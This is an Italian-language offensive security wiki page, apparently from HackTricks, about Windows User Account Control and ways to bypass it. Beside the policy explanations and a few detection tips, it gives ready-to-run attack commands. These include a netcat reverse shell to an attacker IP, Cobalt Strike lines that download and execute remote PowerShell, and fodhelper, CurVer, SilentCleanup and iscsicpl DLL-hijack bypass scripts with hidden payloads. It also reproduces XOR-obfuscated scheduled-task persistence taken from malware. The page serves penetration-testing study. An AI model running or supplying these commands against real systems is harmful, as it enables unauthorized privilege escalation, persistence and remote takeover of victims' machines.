# UAC - Controllo dell'account utente

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita una **richiesta di consenso per le attività con privilegi elevati**. Le applicazioni hanno diversi livelli di `integrity` e un programma con un **livello elevato** può eseguire attività che **potenzialmente potrebbero compromettere il sistema**. Quando UAC è abilitato, le applicazioni e le attività vengono sempre **eseguite nel contesto di sicurezza di un account non amministratore**, a meno che un amministratore non autorizzi esplicitamente tali applicazioni/attività ad avere accesso a livello amministratore al sistema per essere eseguite. È una funzionalità di praticità che protegge gli amministratori da modifiche involontarie, ma non è considerata un confine di sicurezza.<sup>[[2]](#references)</sup>

Per ulteriori informazioni sui livelli di integrità:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando UAC è attivo, a un utente amministratore vengono assegnati 2 token: un token utente standard, per eseguire azioni normali con integrità media, e uno con i privilegi di amministratore.

Questa [pagina](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) illustra in modo approfondito il funzionamento di UAC e include il processo di accesso, l'esperienza utente e l'architettura di UAC.<sup>[[2]](#references)</sup> Gli amministratori possono usare le policy di sicurezza per configurare il funzionamento di UAC in base alle esigenze della propria organizzazione a livello locale (usando secpol.msc), oppure configurarlo e distribuirlo tramite Group Policy Objects (GPO) in un ambiente di dominio Active Directory. Le varie impostazioni sono descritte in dettaglio [qui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Esistono 10 impostazioni di Group Policy che possono essere configurate per UAC. La tabella seguente fornisce ulteriori dettagli:

| Impostazione di Group Policy                                                                                                                                                                                                                                                                                                                                                           | Chiave di registro                | Impostazione predefinita                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: modalità di approvazione amministratore per l'account Administrator integrato](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabilitata)                                             |
| [User Account Control: comportamento della richiesta di elevazione per gli amministratori in modalità di approvazione amministratore](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Richiedi il consenso per i binari non Windows sul desktop sicuro) |
| [User Account Control: comportamento della richiesta di elevazione per gli utenti standard](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Richiedi le credenziali sul desktop sicuro)         |
| [User Account Control: rileva le installazioni di applicazioni e richiedi l'elevazione](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Abilitata; disabilitata per impostazione predefinita in Enterprise)           |
| [User Account Control: eleva solo gli eseguibili firmati e convalidati](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabilitata)                                             |
| [User Account Control: eleva solo le applicazioni UIAccess installate in percorsi sicuri](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Abilitata)                                              |
| [User Account Control: esegui tutti gli amministratori in modalità di approvazione amministratore](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Abilitata)                                              |
| [User Account Control: consenti alle applicazioni UIAccess di richiedere l'elevazione senza usare il desktop sicuro](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabilitata)                                             |
| [User Account Control: passa al desktop sicuro quando viene richiesta l'elevazione](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Abilitata)                                              |
| [User Account Control: virtualizza gli errori di scrittura di file e registro nei percorsi per utente](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Abilitata)                                              |

### Policy per l'installazione di software su Windows

Le **policy di sicurezza locali** ("secpol.msc" nella maggior parte dei sistemi) sono configurate per impostazione predefinita per **impedire agli utenti non amministratori di eseguire installazioni software**. Ciò significa che anche se un utente non amministratore può scaricare l'installer del software, non potrà eseguirlo senza un account amministratore.

### Chiavi di registro per obbligare UAC a richiedere l'elevazione

Come utente standard senza diritti di amministratore, puoi fare in modo che l'account "standard" **riceva da UAC una richiesta delle credenziali** quando tenta di eseguire determinate azioni. Questa azione richiederebbe la modifica di alcune **chiavi di registro**, per le quali sono necessarie autorizzazioni amministrative, a meno che non sia presente un **UAC bypass** oppure l'attaccante non abbia già effettuato l'accesso come amministratore.

Anche se l'utente appartiene al gruppo **Administrators**, queste modifiche obbligano l'utente a **reinserire le credenziali del proprio account** per eseguire azioni amministrative.

**In pratica, ciò è utile solo quando si dispone già di un token elevato, di un UAC bypass o di una configurazione errata che consente di modificare queste chiavi; in caso contrario, la scrittura nel registro viene bloccata.**

Le chiavi e le voci di registro da modificare sono le seguenti (con i relativi valori predefiniti tra parentesi):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Questa operazione può essere eseguita anche manualmente tramite lo strumento Local Security Policy. Dopo la modifica, le operazioni amministrative richiedono all'utente di reinserire le proprie credenziali.

### Nota

**User Account Control non è un confine di sicurezza.** Pertanto, gli utenti standard non possono evadere dai propri account e ottenere diritti di amministratore senza un exploit di local privilege escalation.

### Chiedere a un utente il "full computer access"
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Privilegi UAC

- La Modalità protetta di Internet Explorer utilizza controlli di integrità per impedire ai processi con livello di integrità elevato (come i browser web) di accedere a dati con livello di integrità basso (come la cartella dei file Internet temporanei). Questo viene ottenuto eseguendo il browser con un token a bassa integrità. Quando il browser tenta di accedere ai dati archiviati nella zona a bassa integrità, il sistema operativo controlla il livello di integrità del processo e consente l'accesso di conseguenza. Questa funzionalità contribuisce a impedire agli attacchi di remote code execution di ottenere accesso ai dati sensibili del sistema.
- Quando un utente accede a Windows, il sistema crea un token di accesso che contiene un elenco dei privilegi dell'utente. I privilegi sono definiti come la combinazione dei diritti e delle capacità di un utente. Il token contiene anche un elenco delle credenziali dell'utente, ovvero le credenziali utilizzate per autenticare l'utente al computer e alle risorse della rete.

### Autoadminlogon

Per configurare Windows in modo che effettui automaticamente l'accesso con un utente specifico all'avvio, imposta la **chiave di registro `AutoAdminLogon`**. È utile negli ambienti kiosk o a scopo di testing. Utilizzala solo su sistemi sicuri, poiché espone la password nel registro.

Imposta le seguenti chiavi utilizzando l'Editor del Registro di sistema o `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Per ripristinare il comportamento di accesso normale, imposta `AutoAdminLogon` su 0.

## UAC bypass

> [!TIP]
> Nota che, se hai accesso grafico al victim, UAC bypass è semplice, poiché puoi fare clic su "Sì" quando viene visualizzato il prompt UAC

UAC bypass è necessario nella seguente situazione: **UAC è attivato, il tuo processo è in esecuzione in un contesto di integrità media e il tuo utente appartiene al gruppo administrators**.

È importante sottolineare che è **molto più difficile effettuare UAC bypass se il livello di sicurezza è impostato sul valore più elevato (Always) rispetto a uno qualsiasi degli altri livelli (Default).**

### Triage rapido da una shell con integrità media

Prima di tentare un bypass, conferma di trovarti nello scenario corretto e associa la build dell'host ai metodi noti funzionanti:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Note pratiche:
- Se `EnableLUA=0`, non è necessario alcun bypass: qualsiasi token amministrativo può richiedere direttamente un livello di integrità elevato.
- `ConsentPromptBehaviorAdmin=2` o `5` è lo scenario comune per i bypass auto-elevate / basati su COM.
- `Always Notify` aumenta il livello di difficoltà, ma è comunque necessario testare la build esatta invece di presumere un fallimento: UACME tiene ancora traccia di alcuni metodi `AlwaysNotify compatible` nelle build moderne di Windows.<sup>[[3]](#references)</sup>

### UAC disabilitato

Se UAC è già disabilitato (`ConsentPromptBehaviorAdmin` è **`0`**), puoi **eseguire una reverse shell con privilegi amministrativi** (livello di integrità elevato) usando qualcosa come:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + oggetto di debug riutilizzabile

L'interfaccia RPC locale `201ef99a-7fa0-444c-9399-19ba84f12a1a` può creare un processo con il debugging abilitato. I processi creati tramite debug sullo stesso thread condividono l'oggetto di debug del thread; un evento di debug relativo alla creazione contiene un handle del processo con accesso completo anche quando il risultato RPC concede soltanto un accesso limitato. Questo trasforma il riutilizzo dell'oggetto di debug in una primitiva UAC per un membro del gruppo Administrators con integrità media.<sup>[[11]](#references)[[12]](#references)</sup>

Una catena pratica è:<sup>[[11]](#references)[[12]](#references)</sup>

1. Chiama il metodo RPC locale (direttamente o tramite `NdrAsyncClientCall`) per creare un processo sacrificale non elevato con il debugging abilitato.
2. Interroga `ProcessDebugObjectHandle` con `NtQueryInformationProcess`, scollegalo con `NtRemoveProcessDebug`, conserva l'oggetto e termina il processo sacrificale.
3. Usa la stessa interfaccia RPC per creare un processo trusted auto-elevated, quindi associa l'oggetto salvato al thread chiamante tramite `DbgUiSetThreadDebugObject`.
4. Chiama `WaitForDebugEvent` e acquisisci l'handle del processo `CREATE_PROCESS_DEBUG_EVENT`; duplicalo con `NtDuplicateObject` prima di continuare.
5. Fornisci l'handle duplicato a `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` e avvia il payload con una struttura extended startup-info. In questo modo riutilizzi il contesto del processo elevato e assegni al processo figlio una relazione con il parent dall'aspetto trusted.

Cerca la breve sequenza invece del solo binary auto-elevated: creazione di processi tramite RPC locale di AppInfo, query `ProcessDebugObjectHandle`, detach/reattach del debugger, un evento di debug relativo alla creazione immediatamente successivo, duplicazione degli handle e un processo figlio il cui parent registrato non corrisponde al processo che ha eseguito le API di creazione.<sup>[[12]](#references)</sup>

### **Very** Basic UAC "bypass" (accesso completo al file system)

Se hai una shell con un utente che appartiene al gruppo Administrators, puoi **montare la condivisione C$** tramite SMB (file system) localmente in un nuovo disco e avrai **accesso a tutto ciò che si trova nel file system** (anche alla home folder dell'Administrator).

> [!WARNING]
> **Sembra che questo trick non funzioni più**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass con Cobalt Strike

Le tecniche di Cobalt Strike funzioneranno solo se UAC non è impostato al livello di sicurezza massimo
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** dispongono inoltre di diversi moduli per **bypassare** la **UAC**.

### Interfacce COM elevate (`ICMLuaUtil` / `CMSTPLUA`)

Gli oggetti COM con auto-elevazione rimangono una superficie UAC pratica nelle build moderne. `ICMLuaUtil` è ancora indicato da UACME come funzionante negli attuali rami di Windows, e gli strumenti offensivi continuano ad adattare `CMSTPLUA` combinando un processo desktop interattivo, l'esecuzione a 64 bit e, talvolta, il masquerading del PEB/processo prima di richiamare il COM Elevation Moniker.<sup>[[3]](#references)</sup>

Suggerimenti pratici:
- Preferisci un processo **a 64 bit** nella **sessione interattiva** dell'utente (comunemente `explorer.exe` o un suo processo figlio).
- Se una shell grezza fallisce, riprova da un'implementazione BOF / UACME invece di un wrapper ingenuo di `CreateProcess`.
- Prevedi che l'esecuzione figlia avvenga in un **processo elevato separato**; molti BOF non elevano il beacon corrente direttamente.

### KRBUACBypass

Documentazione e tool disponibili su [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploit per il bypass della UAC

[**UACME**](https://github.com/hfiref0x/UACME) è una raccolta di tecniche per bypassare la UAC. Compilalo con Visual Studio o MSBuild; la build crea diversi eseguibili (ad esempio, `Source\Akagi\output\x64\Debug\Akagi.exe`), quindi seleziona il metodo appropriato per la build target.<sup>[[3]](#references)</sup>\
Fai attenzione: alcuni bypass avviano programmi o prompt visibili che possono allertare l'utente.<sup>[[3]](#references)</sup>

UACME indica la **versione di build a partire dalla quale ogni tecnica ha iniziato a funzionare**.<sup>[[3]](#references)</sup> Puoi cercare una tecnica che influisca sulle tue versioni:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Inoltre, usando [questa](https://en.wikipedia.org/wiki/Windows_10_version_history) pagina ottieni la release Windows `1607` dalle versioni delle build.

Un workflow pratico consiste nel **valutare prima la build dell'host** e solo dopo eseguire il metodo corrispondente:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` confronta rapidamente la build locale con i metodi UAC noti, utile per scartare rapidamente i PoC non più validi.<sup>[[4]](#references)</sup>
- `UACME` rimane il miglior catalogo pubblico per associare un bypass a una build precisa. La versione 3.7.1 ha aggiunto i metodi 83–85, mentre la release precedente ha verificato nuovamente i metodi esistenti su **Windows 11 25H2**; ricontrolla la tabella dei metodi e le note di rilascio invece di presumere che un vecchio PoC sia ancora applicabile senza modifiche.<sup>[[3]](#references)[[9]](#references)</sup>

### Catene WNF/UIAccess compatibili con Always Notify (UACME 3.7.1)

`Always Notify` non elimina ogni UAC bypass. UACME 3.7.1 implementa tre nuovi metodi x64 che combinano stato dell'ambiente/protocollo controllabile dall'utente con il comportamento di task pianificati elevati o di UIAccess, e li contrassegna tutti come `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** reindirizza `SystemRoot` in modo che il WNF attivi `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`, facendo eseguire a `taskhostw.exe` elevato un side-load di `unifiedconsent.dll`. UACME lo supporta a partire dalla build 19041 di Windows 10.
- **84 — TabTip:** usa la stessa primitive della variabile d'ambiente contro `TabTip.exe` con UIAccess, che carica `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` o `rsaenh.dll` a seconda della build, quindi effettua il pivot dal contesto UIAccess risultante con alta integrità. UACME lo supporta a partire da Windows 8.1 / Server 2016.
- **85 — Narrator:** dirotta il protocollo per utente `feedback-hub`, controlla Narrator con `Alt+CapsLock+F`, quindi avvia una copia scrivibile di `osk.exe` che esegue un side-load di `OskSupport.dll`. Richiede un desktop interattivo ed è supportato a partire da Windows 10 1809 / Server 2019.

Dopo aver creato le unità payload e Akagi come documentato da UACME, richiama il numero del metodo corrispondente (il comando opzionale predefinito è `cmd.exe`):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Methods 84 e 85 dipendono da UIAccess/interazione con il desktop, quindi non aspettarti che funzionino senza modifiche dalla Session 0 o da una shell di servizio non interattiva. Tutti e tre manipolano lo stato dell'ambiente/del protocollo e preparano DLL; esamina l'implementazione e rimuovi questi artefatti dopo i test.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Il binary trusted `fodhelper.exe` viene auto-elevated nelle versioni moderne di Windows. Quando viene avviato, interroga il percorso del registro per utente riportato di seguito senza validare il verbo `DelegateExecute`. Inserire un comando in quel percorso consente a un processo con Medium Integrity (l'utente è membro del gruppo Administrators) di avviare un processo con High Integrity senza un prompt UAC.

Percorso del registro interrogato da fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Passaggi PowerShell (imposta il payload, quindi attivalo)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Note:
- Funziona quando l'utente corrente è membro del gruppo Administrators e il livello UAC è predefinito/permissivo (non Always Notify con restrizioni aggiuntive).
- Usa il percorso `sysnative` per avviare una PowerShell a 64 bit da un processo a 32 bit su Windows a 64 bit.
- Il payload può essere qualsiasi comando (PowerShell, cmd o un percorso EXE). Evita le UI che richiedono interazione per mantenere la stealth.

#### Variante di hijack di CurVer/estensione (solo HKCU)

I sample recenti che abusano di `fodhelper.exe` evitano `DelegateExecute` e invece **reindirizzano il ProgID `ms-settings`** tramite il valore `CurVer` specifico dell'utente. Il binario auto-elevato continua a risolvere l'handler in `HKCU`, quindi non è necessario un token amministrativo per inserire le chiavi:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Una volta ottenuta l’elevazione, il malware comunemente **disabilita le richieste future** impostando `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` su `0`, quindi esegue ulteriori attività di defense evasion (ad esempio, `Add-MpPreference -ExclusionPath C:\ProgramData`) e ricrea la persistenza per essere eseguito con alta integrità. Un’attività di persistenza tipica memorizza su disco uno **script PowerShell crittografato con XOR** e lo decodifica/esegue in memoria ogni ora:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Questa variante continua a ripulire il **dropper** e lascia soltanto gli **staged payloads**, rendendo il rilevamento dipendente dal monitoraggio del **`CurVer` hijack**, dalla manomissione di `ConsentPromptBehaviorAdmin`, dalla creazione di esclusioni di Defender o da scheduled tasks che decrittano PowerShell in memoria.<sup>[[5]](#references)</sup>

### UAC bypass tramite il task `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` avvia `cleanmgr.exe` con i privilegi più elevati ed espande `%windir%` dall'ambiente dell'utente. Se controlli `HKCU\Environment\windir`, puoi reindirizzare tale espansione verso un comando arbitrario e ottenere un'integrità elevata senza una finestra di consenso.<sup>[[8]](#references)</sup> Vale ancora la pena testare questo metodo sulle build recenti, perché UACME mantiene attiva la tecnica e il monitoraggio recente dei problemi indica che Windows 11 24H2 potrebbe richiedere soltanto piccoli aggiustamenti alle virgolette.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Se il task cita il path in quella build, riprova con il payload che termina con una virgoletta (ad esempio `cmd.exe"`). Esegui sempre il cleanup di `HKCU\Environment\windir` dopo il test.

#### Altri UAC bypass

Molti UAC bypass classici che abusano dei flussi dell'interfaccia utente, degli oggetti COM o dell'interazione con il desktop richiedono una **full interactive session** con la vittima; una shell comune tramite `nc.exe` o un servizio in esecuzione nella **Session 0** spesso non è sufficiente.

Spesso puoi risolvere il problema usando una sessione **meterpreter**. Esegui la migrazione verso un **processo** che abbia il valore **Session** uguale a **1**:

![Imposta ms-settings su un'estensione personalizzata (.thm) e associa tale estensione al nostro payload - Altri UAC bypass: puoi farlo usando una sessione meterpreter. Esegui la migrazione verso un processo che abbia il valore Session...](<../../images/image (863).png>)

(_explorer.exe_ dovrebbe funzionare)

### UAC Bypass con GUI

Se hai accesso a una **GUI**, puoi semplicemente accettare il prompt UAC quando compare; non hai realmente bisogno di un bypass tecnico. Pertanto, ottenere una sessione GUI è spesso sufficiente per aggirare l'attrito pratico aggiunto da UAC.

Inoltre, se ottieni una sessione GUI che qualcuno stava usando (potenzialmente tramite RDP), ci sono **alcuni strumenti che saranno in esecuzione come amministratore**, dai quali potresti **eseguire** direttamente un **cmd** ad esempio **come amministratore**, senza che UAC richieda nuovamente l'autorizzazione, come [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Questo potrebbe essere un po' più **stealthy**.

### UAC bypass rumoroso tramite brute-force

Se il rumore è accettabile, uno strumento come [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) può richiedere ripetutamente l'elevazione finché l'utente non la accetta.

### Il tuo bypass - Metodologia di base per UAC bypass

Se osservi **UACME**, noterai che **molti UAC bypass abusano del DLL hijacking** (spesso facendo caricare a un binary elevato una DLL controllata dall'attacker da un path scrivibile). [Leggi questo per scoprire come trovare una vulnerabilità di DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Trova un binary che esegua **autoelevate** (verifica che, quando viene eseguito, funzioni a un livello di integrità elevato).
2. Con procmon, trova gli eventi "**NAME NOT FOUND**" che potrebbero essere vulnerabili al **DLL Hijacking**.
3. Probabilmente dovrai **scrivere** la DLL all'interno di alcuni **path protetti** (come C:\Windows\System32), nei quali non hai permessi di scrittura. Puoi aggirare il problema usando:
1. **wusa.exe**: Windows 7, 8 e 8.1. Consente di estrarre il contenuto di un file CAB all'interno di path protetti (perché questo tool viene eseguito da un livello di integrità elevato).
2. **IFileOperation**: Windows 10.
4. Prepara uno **script** per copiare la DLL all'interno del path protetto ed eseguire il binary vulnerabile e autoelevated.

### Un'altra tecnica di UAC bypass

Consiste nel verificare se un **binary autoElevated** tenta di **leggere** dal **registry** il **nome/path** di un **binary** o di un **command** da **eseguire** (questo è più interessante se il binary cerca queste informazioni all'interno di **HKCU**).

### UAC bypass tramite `SysWOW64\iscsicpl.exe` + DLL hijack del `PATH` dell'utente

Il `C:\Windows\SysWOW64\iscsicpl.exe` a 32 bit è un binary **auto-elevated** che può essere abusato per caricare `iscsiexe.dll` in base all'ordine di ricerca. Se puoi inserire una `iscsiexe.dll` malevola all'interno di una cartella **scrivibile dall'utente** e modificare il `PATH` dell'utente corrente (ad esempio tramite `HKCU\Environment\Path`) in modo che tale cartella venga cercata, Windows potrebbe caricare la DLL dell'attacker all'interno del processo `iscsicpl.exe` elevato **senza mostrare un prompt UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Note pratiche:
- È utile quando l'utente corrente appartiene al gruppo **Administrators**, ma opera a **Medium Integrity** a causa di UAC.
- La copia in **SysWOW64** è quella rilevante per questo bypass. Considera la copia in **System32** come un binary separato e convalida il comportamento in modo indipendente.
- La primitive è una combinazione di **auto-elevation** e **DLL search-order hijacking**, quindi lo stesso workflow di ProcMon usato per altri UAC bypass è utile per convalidare il caricamento della DLL mancante.

Flusso minimo:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Idee per il rilevamento:
- Genera un alert su `reg add` / scritture nel registro verso `HKCU\Environment\Path` seguite immediatamente dall'esecuzione di `C:\Windows\SysWOW64\iscsicpl.exe`.
- Cerca `iscsiexe.dll` in posizioni **controllate dall'utente** come `%TEMP%` o `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Metti in correlazione l'avvio di `iscsicpl.exe` con processi figlio imprevisti o caricamenti di DLL al di fuori delle normali directory di Windows.

### Ricerche più recenti da verificare separatamente

Alcune catene successive al 2024 non assomigliano più ai classici registry hijack di `HKCU\Software\Classes`. Ad esempio, l'activation-context cache poisoning può concatenare una **rimappatura dell'unità** e il **DLL redirection** per passare da un'integrità media a una elevata tramite binary trusted UI / auto-elevated come `ctfmon.exe` e, successivamente, target come `fodhelper.exe`. Invece di duplicare qui il PoC completo, consulta gli esempi compatti di payload in:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack della lettera dell'unità di Administrator Protection (preview) tramite la mappa dei dispositivi DOS per sessione di logon

> [!NOTE]
> Ad agosto 2026, Microsoft documenta ancora Administrator Protection come **Insider preview**: il rollout di ottobre 2025 è stato annullato ed è previsto per una data successiva. Prima di testare queste catene, verifica che **Admin Approval Mode with Administrator protection** sia effettivamente abilitato e che il dispositivo sia stato riavviato; la sola stringa di versione 25H2 standard non dimostra che la funzionalità sia attiva.<sup>[[10]](#references)</sup>

Per l'intera attack surface di `RAiLaunchAdminProcess` / UIAccess sulle preview build di Windows 11 25H2, consulta la pagina dedicata:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

